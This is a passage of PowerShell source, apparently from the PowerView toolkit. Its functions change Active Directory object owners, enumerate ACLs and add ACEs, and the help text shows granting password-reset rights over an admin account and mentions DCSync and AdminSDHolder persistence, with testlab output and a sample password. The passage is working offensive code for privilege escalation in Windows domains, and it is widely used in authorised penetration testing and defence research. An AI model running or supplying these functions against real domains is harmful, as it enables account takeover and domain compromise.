$DsEntry = $OU.GetDirectoryEntry()
$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'
$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
$dsEntry.PsBase.CommitChanges()

Adds an ACE to all computer objects in the OU "Workstations" permitting the
user "itadmin" to read the confidential ms-Mcs-AdmPwd computer property.

.OUTPUTS

System.Security.AccessControl.AuthorizationRule
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Security.AccessControl.AuthorizationRule')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True, Mandatory = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $PrincipalIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $PrincipalDomain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $True)]
        [ValidateSet('AccessSystemSecurity', 'CreateChild','Delete','DeleteChild','DeleteTree','ExtendedRight','GenericAll','GenericExecute','GenericRead','GenericWrite','ListChildren','ListObject','ReadControl','ReadProperty','Self','Synchronize','WriteDacl','WriteOwner','WriteProperty')]
        $Right,

        [Parameter(Mandatory = $True, ParameterSetName='AccessRuleType')]
        [ValidateSet('Allow', 'Deny')]
        [String[]]
        $AccessControlType,

        [Parameter(Mandatory = $True, ParameterSetName='AuditRuleType')]
        [ValidateSet('Success', 'Failure')]
        [String]
        $AuditFlag,

        [Parameter(Mandatory = $False, ParameterSetName='AccessRuleType')]
        [Parameter(Mandatory = $False, ParameterSetName='AuditRuleType')]
        [Parameter(Mandatory = $False, ParameterSetName='ObjectGuidLookup')]
        [Guid]
        $ObjectType,

        [ValidateSet('All', 'Children','Descendents','None','SelfAndChildren')]
        [String]
        $InheritanceType,

        [Guid]
        $InheritedObjectType
    )

    Begin {
        if ($PrincipalIdentity -notmatch '^S-1-.*') {
            $PrincipalSearcherArguments = @{
                'Identity' = $PrincipalIdentity
                'Properties' = 'distinguishedname,objectsid'
            }
            if ($PSBoundParameters['PrincipalDomain']) { $PrincipalSearcherArguments['Domain'] = $PrincipalDomain }
            if ($PSBoundParameters['Server']) { $PrincipalSearcherArguments['Server'] = $Server }
            if ($PSBoundParameters['SearchScope']) { $PrincipalSearcherArguments['SearchScope'] = $SearchScope }
            if ($PSBoundParameters['ResultPageSize']) { $PrincipalSearcherArguments['ResultPageSize'] = $ResultPageSize }
            if ($PSBoundParameters['ServerTimeLimit']) { $PrincipalSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
            if ($PSBoundParameters['Tombstone']) { $PrincipalSearcherArguments['Tombstone'] = $Tombstone }
            if ($PSBoundParameters['Credential']) { $PrincipalSearcherArguments['Credential'] = $Credential }
            $Principal = Get-DomainObject @PrincipalSearcherArguments
            if (-not $Principal) {
                throw "Unable to resolve principal: $PrincipalIdentity"
            }
            elseif($Principal.Count -gt 1) {
                throw "PrincipalIdentity matches multiple AD objects, but only one is allowed"
            }
            $ObjectSid = $Principal.objectsid
        }
        else {
            $ObjectSid = $PrincipalIdentity
        }

        $ADRight = 0
        foreach($r in $Right) {
            $ADRight = $ADRight -bor (([System.DirectoryServices.ActiveDirectoryRights]$r).value__)
        }
        $ADRight = [System.DirectoryServices.ActiveDirectoryRights]$ADRight

        $Identity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$ObjectSid)
    }

    Process {
        if($PSCmdlet.ParameterSetName -eq 'AuditRuleType') {

            if($ObjectType -eq $null -and $InheritanceType -eq [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag
            } elseif($ObjectType -eq $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType)
            } elseif($ObjectType -eq $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType), $InheritedObjectType
            } elseif($ObjectType -ne $null -and $InheritanceType -eq [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag, $ObjectType
            } elseif($ObjectType -ne $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag, $ObjectType, $InheritanceType
            } elseif($ObjectType -ne $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag, $ObjectType, $InheritanceType, $InheritedObjectType
            }

        }
        else {

            if($ObjectType -eq $null -and $InheritanceType -eq [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType
            } elseif($ObjectType -eq $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType)
            } elseif($ObjectType -eq $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType), $InheritedObjectType
            } elseif($ObjectType -ne $null -and $InheritanceType -eq [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType, $ObjectType
            } elseif($ObjectType -ne $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType, $ObjectType, $InheritanceType
            } elseif($ObjectType -ne $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType, $ObjectType, $InheritanceType, $InheritedObjectType
            }

        }
    }
}


function Set-DomainObjectOwner {
<#
.SYNOPSIS

Modifies the owner for a specified active directory object.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainObject  

.DESCRIPTION

Retrieves the Active Directory object specified by -Identity by splatting to
Get-DomainObject, returning the raw searchresult object. Retrieves the raw
directoryentry for the object, and sets the object owner to -OwnerIdentity.

.PARAMETER Identity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)
of the AD object to set the owner for.

.PARAMETER OwnerIdentity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)
of the owner to set for -Identity.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Set-DomainObjectOwner -Identity dfm -OwnerIdentity harmj0y

Set the owner of 'dfm' in the current domain to 'harmj0y'.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Set-DomainObjectOwner -Identity dfm -OwnerIdentity harmj0y -Credential $Cred

Set the owner of 'dfm' in the current domain to 'harmj0y' using the alternate credentials.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $Identity,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('Owner')]
        [String]
        $OwnerIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $LDAPFilter }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }

        $OwnerSid = Get-DomainObject @SearcherArguments -Identity $OwnerIdentity -Properties objectsid | Select-Object -ExpandProperty objectsid
        if ($OwnerSid) {
            $OwnerIdentityReference = [System.Security.Principal.SecurityIdentifier]$OwnerSid
        }
        else {
            Write-Warning "[Set-DomainObjectOwner] Error parsing owner identity '$OwnerIdentity'"
        }
    }

    PROCESS {
        if ($OwnerIdentityReference) {
            $SearcherArguments['Raw'] = $True
            $SearcherArguments['Identity'] = $Identity

            # splat the appropriate arguments to Get-DomainObject
            $RawObject = Get-DomainObject @SearcherArguments

            ForEach ($Object in $RawObject) {
                try {
                    Write-Verbose "[Set-DomainObjectOwner] Attempting to set the owner for '$Identity' to '$OwnerIdentity'"
                    $Entry = $RawObject.GetDirectoryEntry()
                    $Entry.PsBase.Options.SecurityMasks = 'Owner'
                    $Entry.PsBase.ObjectSecurity.SetOwner($OwnerIdentityReference)
                    $Entry.PsBase.CommitChanges()
                }
                catch {
                    Write-Warning "[Set-DomainObjectOwner] Error setting owner: $_"
                }
            }
        }
    }
}


function Get-DomainObjectAcl {
<#
.SYNOPSIS

Returns the ACLs associated with a specific active directory object. By default
the DACL for the object(s) is returned, but the SACL can be returned with -Sacl.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Get-DomainGUIDMap  

.PARAMETER Identity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).
Wildcards accepted.

.PARAMETER Sacl

Switch. Return the SACL instead of the DACL for the object (default behavior).

.PARAMETER ResolveGUIDs

Switch. Resolve GUIDs to their display names.

.PARAMETER RightsFilter

A specific set of rights to return ('All', 'ResetPassword', 'WriteMembers').

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainObjectAcl -Identity matt.admin -domain testlab.local -ResolveGUIDs

Get the ACLs for the matt.admin user in the testlab.local domain and
resolve relevant GUIDs to their display names.

.EXAMPLE

Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs

Enumerate the ACL permissions for all OUs in the domain.

.EXAMPLE

Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs -Sacl

Enumerate the SACLs for all OUs in the domain, resolving GUIDs.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainObjectAcl -Credential $Cred -ResolveGUIDs

.OUTPUTS

PowerView.ACL

Custom PSObject with ACL entries.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ACL')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $Identity,

        [Switch]
        $Sacl,

        [Switch]
        $ResolveGUIDs,

        [String]
        [Alias('Rights')]
        [ValidateSet('All', 'ResetPassword', 'WriteMembers')]
        $RightsFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{
            'Properties' = 'samaccountname,ntsecuritydescriptor,distinguishedname,objectsid'
        }

        if ($PSBoundParameters['Sacl']) {
            $SearcherArguments['SecurityMasks'] = 'Sacl'
        }
        else {
            $SearcherArguments['SecurityMasks'] = 'Dacl'
        }
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $Searcher = Get-DomainSearcher @SearcherArguments

        $DomainGUIDMapArguments = @{}
        if ($PSBoundParameters['Domain']) { $DomainGUIDMapArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Server']) { $DomainGUIDMapArguments['Server'] = $Server }
        if ($PSBoundParameters['ResultPageSize']) { $DomainGUIDMapArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $DomainGUIDMapArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Credential']) { $DomainGUIDMapArguments['Credential'] = $Credential }

        # get a GUID -> name mapping
        if ($PSBoundParameters['ResolveGUIDs']) {
            $GUIDs = Get-DomainGUIDMap @DomainGUIDMapArguments
        }
    }

    PROCESS {
        if ($Searcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                if ($IdentityInstance -match '^S-1-.*') {
                    $IdentityFilter += "(objectsid=$IdentityInstance)"
                }
                elseif ($IdentityInstance -match '^(CN|OU|DC)=.*') {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname
                        #   and rebuild the domain searcher
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[Get-DomainObjectAcl] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        $SearcherArguments['Domain'] = $IdentityDomain
                        $Searcher = Get-DomainSearcher @SearcherArguments
                        if (-not $Searcher) {
                            Write-Warning "[Get-DomainObjectAcl] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $IdentityFilter += "(objectguid=$GuidByteString)"
                }
                elseif ($IdentityInstance.Contains('.')) {
                    $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
                }
                else {
                    $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(displayname=$IdentityInstance))"
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }

            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[Get-DomainObjectAcl] Using additional LDAP filter: $LDAPFilter"
                $Filter += "$LDAPFilter"
            }

            if ($Filter) {
                $Searcher.filter = "(&$Filter)"
            }
            Write-Verbose "[Get-DomainObjectAcl] Get-DomainObjectAcl filter string: $($Searcher.filter)"

            $Results = $Searcher.FindAll()
            $Results | Where-Object {$_} | ForEach-Object {
                $Object = $_.Properties

                if ($Object.objectsid -and $Object.objectsid[0]) {
                    $ObjectSid = (New-Object System.Security.Principal.SecurityIdentifier($Object.objectsid[0],0)).Value
                }
                else {
                    $ObjectSid = $Null
                }

                try {
                    New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $Object['ntsecuritydescriptor'][0], 0 | ForEach-Object { if ($PSBoundParameters['Sacl']) {$_.SystemAcl} else {$_.DiscretionaryAcl} } | ForEach-Object {
                        if ($PSBoundParameters['RightsFilter']) {
                            $GuidFilter = Switch ($RightsFilter) {
                                'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }
                                'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }
                                Default { '00000000-0000-0000-0000-000000000000' }
                            }
                            if ($_.ObjectType -eq $GuidFilter) {
                                $_ | Add-Member NoteProperty 'ObjectDN' $Object.distinguishedname[0]
                                $_ | Add-Member NoteProperty 'ObjectSID' $ObjectSid
                                $Continue = $True
                            }
                        }
                        else {
                            $_ | Add-Member NoteProperty 'ObjectDN' $Object.distinguishedname[0]
                            $_ | Add-Member NoteProperty 'ObjectSID' $ObjectSid
                            $Continue = $True
                        }

                        if ($Continue) {
                            $_ | Add-Member NoteProperty 'ActiveDirectoryRights' ([Enum]::ToObject([System.DirectoryServices.ActiveDirectoryRights], $_.AccessMask))
                            if ($GUIDs) {
                                # if we're resolving GUIDs, map them them to the resolved hash table
                                $AclProperties = @{}
                                $_.psobject.properties | ForEach-Object {
                                    if ($_.Name -match 'ObjectType|InheritedObjectType|ObjectAceType|InheritedObjectAceType') {
                                        try {
                                            $AclProperties[$_.Name] = $GUIDs[$_.Value.toString()]
                                        }
                                        catch {
                                            $AclProperties[$_.Name] = $_.Value
                                        }
                                    }
                                    else {
                                        $AclProperties[$_.Name] = $_.Value
                                    }
                                }
                                $OutObject = New-Object -TypeName PSObject -Property $AclProperties
                                $OutObject.PSObject.TypeNames.Insert(0, 'PowerView.ACL')
                                $OutObject
                            }
                            else {
                                $_.PSObject.TypeNames.Insert(0, 'PowerView.ACL')
                                $_
                            }
                        }
                    }
                }
                catch {
                    Write-Verbose "[Get-DomainObjectAcl] Error: $_"
                }
            }
        }
    }
}


function Add-DomainObjectAcl {
<#
.SYNOPSIS

Adds an ACL for a specific active directory object.

AdminSDHolder ACL approach from Sean Metcalf (@pyrotek3): https://adsecurity.org/?p=1906

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainObject  

.DESCRIPTION

This function modifies the ACL/ACE entries for a given Active Directory
target object specified by -TargetIdentity. Available -Rights are
'All', 'ResetPassword', 'WriteMembers', 'DCSync', or a manual extended
rights GUID can be set with -RightsGUID. These rights are granted on the target
object for the specified -PrincipalIdentity.

.PARAMETER TargetIdentity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)
for the domain object to modify ACLs for. Required. Wildcards accepted.

.PARAMETER TargetDomain

Specifies the domain for the TargetIdentity to use for the modification, defaults to the current domain.

.PARAMETER TargetLDAPFilter

Specifies an LDAP query string that is used to filter Active Directory object targets.

.PARAMETER TargetSearchBase

The LDAP source to search through for targets, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER PrincipalIdentity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)
for the domain principal to add for the ACL. Required. Wildcards accepted.

.PARAMETER PrincipalDomain

Specifies the domain for the TargetIdentity to use for the principal, defaults to the current domain.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.PARAMETER Rights

Rights to add for the principal, 'All', 'ResetPassword', 'WriteMembers', 'DCSync'.
Defaults to 'All'.

.PARAMETER RightsGUID

Manual GUID representing the right to add to the target.

.EXAMPLE

$Harmj0ySid = Get-DomainUser harmj0y | Select-Object -ExpandProperty objectsid
Get-DomainObjectACL dfm.a -ResolveGUIDs | Where-Object {$_.securityidentifier -eq $Harmj0ySid}

...

Add-DomainObjectAcl -TargetIdentity dfm.a -PrincipalIdentity harmj0y -Rights ResetPassword -Verbose
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(samAccountName=harmj0y)))
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: [Get-DomainObject] Get-DomainObject filter string:(&(|(samAccountName=dfm.a)))
VERBOSE: [Add-DomainObjectAcl] Granting principal CN=harmj0y,CN=Users,DC=testlab,DC=local 'ResetPassword' on CN=dfm (admin),CN=Users,DC=testlab,DC=local
VERBOSE: [Add-DomainObjectAcl] Granting principal CN=harmj0y,CN=Users,DC=testlab,DC=local rights GUID '00299570-246d-11d0-a768-00aa006e0529' on CN=dfm (admin),CN=Users,DC=testlab,DC=local

Get-DomainObjectACL dfm.a -ResolveGUIDs | Where-Object {$_.securityidentifier -eq $Harmj0ySid }

AceQualifier           : AccessAllowed
ObjectDN               : CN=dfm (admin),CN=Users,DC=testlab,DC=local
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : User-Force-Change-Password
ObjectSID              : S-1-5-21-890171859-3433809279-3366196753-1114
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-890171859-3433809279-3366196753-1108
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

.EXAMPLE

$Harmj0ySid = Get-DomainUser harmj0y | Select-Object -ExpandProperty objectsid
Get-DomainObjectACL testuser -ResolveGUIDs | Where-Object {$_.securityidentifier -eq $Harmj0ySid}

[no results returned]

$SecPassword = ConvertTo-SecureString 'Password123!'-AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Add-DomainObjectAcl -TargetIdentity testuser -PrincipalIdentity harmj0y -Rights ResetPassword -Credential $Cred -Verbose
VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
VERBOSE: [Get-Domain] Extracted domain 'TESTLAB' from -Credential
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(|(samAccountName=harmj0y)(name=harmj0y))))
VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
VERBOSE: [Get-Domain] Extracted domain 'TESTLAB' from -Credential
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(|(samAccountName=testuser)(name=testuser))))
VERBOSE: [Add-DomainObjectAcl] Granting principal CN=harmj0y,CN=Users,DC=testlab,DC=local 'ResetPassword' on CN=testuser testuser,CN=Users,DC=testlab,DC=local
VERBOSE: [Add-DomainObjectAcl] Granting principal CN=harmj0y,CN=Users,DC=testlab,DC=local rights GUID '00299570-246d-11d0-a768-00aa006e0529' on CN=testuser,CN=Users,DC=testlab,DC=local

Get-DomainObjectACL testuser -ResolveGUIDs | Where-Object {$_.securityidentifier -eq $Harmj0ySid }

AceQualifier           : AccessAllowed
ObjectDN               : CN=dfm (admin),CN=Users,DC=testlab,DC=local
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : User-Force-Change-Password
ObjectSID              : S-1-5-21-890171859-3433809279-3366196753-1114
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-890171859-3433809279-3366196753-1108
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

.LINK

https://adsecurity.org/?p=1906
https://social.technet.microsoft.com/Forums/windowsserver/en-US/df3bfd33-c070-4a9c-be98-c4da6e591a0a/forum-faq-using-powershell-to-assign-permissions-on-active-directory-objects?forum=winserverpowershell
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $TargetIdentity,

